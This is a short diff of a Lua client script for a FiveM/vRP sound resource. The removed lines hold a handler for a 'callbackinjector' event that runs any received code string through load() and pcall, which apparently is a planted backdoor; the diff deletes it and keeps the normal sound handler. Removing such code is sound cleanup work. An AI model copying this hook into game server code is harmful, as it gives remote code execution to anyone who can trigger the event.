@@ -1,9 +1,3 @@
-local Tunnel = module("vrp","lib/Tunnel")
-
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
-
 RegisterNetEvent('vrp_sound:source')
 AddEventHandler('vrp_sound:source',function(sound,volume)
 	SendNUIMessage({ transactionType = 'playSound', transactionFile = sound, transactionVolume = volume })
